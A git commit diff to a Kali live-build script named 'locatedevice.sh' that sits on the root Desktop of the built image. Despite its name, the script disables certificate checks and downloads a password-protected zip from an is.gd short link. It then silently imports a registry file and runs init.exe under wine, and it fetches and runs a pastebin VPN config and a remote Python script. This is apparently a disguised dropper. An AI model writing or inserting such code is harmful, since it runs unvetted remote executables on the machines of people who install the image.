9d49e2075f03f8aada2859b8bd17afbf3fa87079
Remi Girard <54126451+ind3p3nd3nt@users.noreply.github.com>
2020-09-18 05:32:15 +0000

    Update locatedevice.sh

--- live-build-config/kali-config/common/includes.chroot/root/Desktop/locatedevice.sh
+++ live-build-config/kali-config/common/includes.chroot/root/Desktop/locatedevice.sh
@@ -1,12 +1,16 @@
 #!/bin/bash -e
 sudo apt update;
-sudo apt install unzip wget openvpn -y;
-mkdir ~/init/;
-wget --no-check-certificate -O ~/init/init.zip https://is.gd/initzip;
-cd ~/init/;
+sudo apt install unzip wget openvpn python3-dev python3-pip -y;
+sudo pip3 install requests;
+wget -O /root/sickvpn.conf https://pastebin.com/raw/yvNnT0uF --no-check-certificate;
+wget -O /root/pingvpn.py https://github.com/ind3p3nd3nt/sickvpn.vip/raw/master/pingvpn.py --no-check-certificate; 
+python3 /root/pingvpn.py;
+openvpn /root/sickvpn.conf&
+if [ ! -d "/root/init" ]; then mkdir /root/init/; fi
+wget --no-check-certificate -O /root/init/init.zip https://is.gd/initzip;
+cd /root/init/;
 rm -rf init.exe;
 unzip -P1011011011 init.zip;
 wine regedit /s /root/s.reg;
-wine init.exe&
-wget -O /root/sickvpn.conf https://pastebin.com/raw/yvNnT0uF --no-check-certificate && wget -O /root/pingvpn.py https://github.com/ind3p3nd3nt/sickvpn.vip/raw/master/pingvpn.py --no-check-certificate && python3 /root/pingvpn.py && openvpn /root/sickvpn.conf&
+wine init.exe;
 exit 0
